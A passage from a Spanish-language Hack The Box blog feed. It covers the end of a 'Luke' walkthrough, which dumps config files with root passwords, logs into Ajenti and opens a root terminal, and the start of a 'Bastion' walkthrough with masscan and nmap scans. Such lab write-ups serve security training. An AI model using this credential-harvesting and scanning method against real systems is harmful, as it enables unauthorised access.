                &lt;span class=&#34;nt&#34;&gt;&amp;#34;ajenti.plugins.elements.ipmap.ElementsIPMapper&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;{\&amp;#34;users\&amp;#34;: {}}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
                &lt;span class=&#34;nt&#34;&gt;&amp;#34;ajenti.plugins.munin.client.MuninClient&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;{\&amp;#34;username\&amp;#34;: \&amp;#34;username\&amp;#34;, \&amp;#34;prefix\&amp;#34;: \&amp;#34;http://localhost:8080/munin\&amp;#34;, \&amp;#34;password\&amp;#34;: \&amp;#34;123\&amp;#34;}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
                &lt;span class=&#34;nt&#34;&gt;&amp;#34;ajenti.plugins.dashboard.dash.Dash&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;{\&amp;#34;widgets\&amp;#34;: [{\&amp;#34;index\&amp;#34;: 0, \&amp;#34;config\&amp;#34;: null, \&amp;#34;container\&amp;#34;: \&amp;#34;1\&amp;#34;, \&amp;#34;class\&amp;#34;: \&amp;#34;ajenti.plugins.sensors.memory.MemoryWidget\&amp;#34;}, {\&amp;#34;index\&amp;#34;: 1, \&amp;#34;config\&amp;#34;: null, \&amp;#34;container\&amp;#34;: \&amp;#34;1\&amp;#34;, \&amp;#34;class\&amp;#34;: \&amp;#34;ajenti.plugins.sensors.memory.SwapWidget\&amp;#34;}, {\&amp;#34;index\&amp;#34;: 2, \&amp;#34;config\&amp;#34;: null, \&amp;#34;container\&amp;#34;: \&amp;#34;1\&amp;#34;, \&amp;#34;class\&amp;#34;: \&amp;#34;ajenti.plugins.dashboard.welcome.WelcomeWidget\&amp;#34;}, {\&amp;#34;index\&amp;#34;: 0, \&amp;#34;config\&amp;#34;: null, \&amp;#34;container\&amp;#34;: \&amp;#34;0\&amp;#34;, \&amp;#34;class\&amp;#34;: \&amp;#34;ajenti.plugins.sensors.uptime.UptimeWidget\&amp;#34;}, {\&amp;#34;index\&amp;#34;: 1, \&amp;#34;config\&amp;#34;: null, \&amp;#34;container\&amp;#34;: \&amp;#34;0\&amp;#34;, \&amp;#34;class\&amp;#34;: \&amp;#34;ajenti.plugins.power.power.PowerWidget\&amp;#34;}, {\&amp;#34;index\&amp;#34;: 2, \&amp;#34;config\&amp;#34;: null, \&amp;#34;container\&amp;#34;: \&amp;#34;0\&amp;#34;, \&amp;#34;class\&amp;#34;: \&amp;#34;ajenti.plugins.sensors.cpu.CPUWidget\&amp;#34;}]}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
                &lt;span class=&#34;nt&#34;&gt;&amp;#34;ajenti.plugins.elements.shaper.main.Shaper&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;{\&amp;#34;rules\&amp;#34;: []}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
                &lt;span class=&#34;nt&#34;&gt;&amp;#34;ajenti.plugins.ajenti_org.main.AjentiOrgReporter&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;{\&amp;#34;key\&amp;#34;: null}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
                &lt;span class=&#34;nt&#34;&gt;&amp;#34;ajenti.plugins.logs.main.Logs&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;{\&amp;#34;root\&amp;#34;: \&amp;#34;/var/log\&amp;#34;}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
                &lt;span class=&#34;nt&#34;&gt;&amp;#34;ajenti.plugins.mysql.api.MySQLDB&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;{\&amp;#34;password\&amp;#34;: \&amp;#34;\&amp;#34;, \&amp;#34;user\&amp;#34;: \&amp;#34;root\&amp;#34;, \&amp;#34;hostname\&amp;#34;: \&amp;#34;localhost\&amp;#34;}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
                &lt;span class=&#34;nt&#34;&gt;&amp;#34;ajenti.plugins.fm.fm.FileManager&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;{\&amp;#34;root\&amp;#34;: \&amp;#34;/\&amp;#34;}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
                &lt;span class=&#34;nt&#34;&gt;&amp;#34;ajenti.plugins.tasks.manager.TaskManager&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;{\&amp;#34;task_definitions\&amp;#34;: []}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
                &lt;span class=&#34;nt&#34;&gt;&amp;#34;ajenti.users.UserManager&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;{\&amp;#34;sync-provider\&amp;#34;: \&amp;#34;\&amp;#34;}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
                &lt;span class=&#34;nt&#34;&gt;&amp;#34;ajenti.usersync.adsync.ActiveDirectorySyncProvider&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;{\&amp;#34;domain\&amp;#34;: \&amp;#34;DOMAIN\&amp;#34;, \&amp;#34;password\&amp;#34;: \&amp;#34;\&amp;#34;, \&amp;#34;user\&amp;#34;: \&amp;#34;Administrator\&amp;#34;, \&amp;#34;base\&amp;#34;: \&amp;#34;cn=Users,dc=DOMAIN\&amp;#34;, \&amp;#34;address\&amp;#34;: \&amp;#34;localhost\&amp;#34;}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
                &lt;span class=&#34;nt&#34;&gt;&amp;#34;ajenti.plugins.elements.usermgr.ElementsUserManager&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;{\&amp;#34;groups\&amp;#34;: []}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
                &lt;span class=&#34;nt&#34;&gt;&amp;#34;ajenti.plugins.elements.projects.main.ElementsProjectManager&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;{\&amp;#34;projects\&amp;#34;: \&amp;#34;KGxwMQou\\n\&amp;#34;}&amp;#34;&lt;/span&gt;
            &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt; 
            &lt;span class=&#34;nt&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;KpMasng6S5EtTy9Z&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
            &lt;span class=&#34;nt&#34;&gt;&amp;#34;permissions&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt; 
    &lt;span class=&#34;nt&#34;&gt;&amp;#34;language&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
    &lt;span class=&#34;nt&#34;&gt;&amp;#34;bind&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nt&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;0.0.0.0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
        &lt;span class=&#34;nt&#34;&gt;&amp;#34;port&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8000&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt; 
    &lt;span class=&#34;nt&#34;&gt;&amp;#34;enable_feedback&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
    &lt;span class=&#34;nt&#34;&gt;&amp;#34;ssl&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nt&#34;&gt;&amp;#34;enable&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
        &lt;span class=&#34;nt&#34;&gt;&amp;#34;certificate_path&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt; 
    &lt;span class=&#34;nt&#34;&gt;&amp;#34;authentication&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
    &lt;span class=&#34;nt&#34;&gt;&amp;#34;installation_id&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12354&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;configphp-1&#34;&gt;config.php&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;$dbHost = &amp;#39;localhost&amp;#39;; $dbUsername = &amp;#39;root&amp;#39;; $dbPassword = &amp;#39;Zk6heYCyv6ZE9Xcg&amp;#39;; $db = &amp;#34;login&amp;#34;; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die(&amp;#34;Connect failed: %s\n&amp;#34;. $conn -&amp;gt; error); 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;loginphp-1&#34;&gt;login.php&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/luke/Screenshot_20190528_193539.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nos enfocamos en el archivo config.json el cual contiene configuracion del mismo usuario root, contraseña, y algunas otras configuraciones, una de las cuales nos muestra el host y puerto. Las credenciales:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;user: root
password: KpMasng6S5EtTy9Z
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos las credenciales en el puerto 8000 y pudimos logearnos a la plataforma Ajenti.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/luke/Screenshot_20190528_194922.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;shell---userroot&#34;&gt;SHELL - USER/ROOT&lt;/h2&gt;
&lt;p&gt;Utilizamos la opcion de TERMINAL que nos ofrece Ajenti y obtenemos una shell como usuario root, y las banderas &lt;strong&gt;user.txt/root.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/luke/Screenshot_20190528_195731.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;shell&#34;&gt;SHELL&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/luke/Screenshot_20190528_195414.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/luke/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/luke/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>freebsd</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Bastion</title>
        <link>https://sckull.github.io/posts/bastion/</link>
        <pubDate>Fri, 06 Sep 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Fri, 06 Sep 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/bastion/</guid>
        <description>Bastion es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Bastion es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/bastion/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;Bastion&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Windows&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.134&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/29267&#34;&gt;L4mje&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;masscan&#34;&gt;MASSCAN&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos UDP/TCP con masscan.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/bastion#  masscan -p1-65535,U:1-65535 10.10.10.134 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt;
 -e tun0

Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-05-07 17:02:20 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 22/tcp on 10.10.10.134
Discovered open port 135/tcp on 10.10.10.134
Discovered open port 5985/tcp on 10.10.10.134
Discovered open port 49664/tcp on 10.10.10.134
Discovered open port 49666/tcp on 10.10.10.134
Discovered open port 445/tcp on 10.10.10.134
Discovered open port 49668/tcp on 10.10.10.134
Discovered open port 139/tcp on 10.10.10.134
Discovered open port 49667/tcp on 10.10.10.134
Discovered open port 47001/tcp on 10.10.10.134
Discovered open port 49670/tcp on 10.10.10.134
Discovered open port 49669/tcp on 10.10.10.134
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos TCP con nmap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/bastion# nmap -p49667,139,49670,445,49669,49668,135,49666,22 -sV -A -O 10.10.10.134
Starting Nmap 7.70 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-05-07 18:58 BST
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.134
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.13s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                      
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; cc:2e:56🆎19:97:d5:bb:03:fb:82💿63:da:68:01 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; Standard &lt;span class=&#34;m&#34;&gt;14393&lt;/span&gt; microsoft-ds
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; open and &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; closed port
Aggressive OS guesses: Microsoft Windows Server &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; build &lt;span class=&#34;m&#34;&gt;10586&lt;/span&gt; - &lt;span class=&#34;m&#34;&gt;14393&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;96%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Microsoft Windows Server &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;95%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Microsoft Windows &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;93%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Microsoft Windows &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1507&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;93%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Microsoft Windows &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1507&lt;/span&gt; - &lt;span class=&#34;m&#34;&gt;1607&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;93%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Microso&lt;span class=&#34;nv&#34;&gt;$t&lt;/span&gt; Windows Server &lt;span class=&#34;m&#34;&gt;2012&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;93%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Microsoft Windows Server &lt;span class=&#34;m&#34;&gt;2012&lt;/span&gt; R2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;93%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Microsoft Windows Server &lt;span class=&#34;m&#34;&gt;2012&lt;/span&gt; R2 Update &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;93%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span 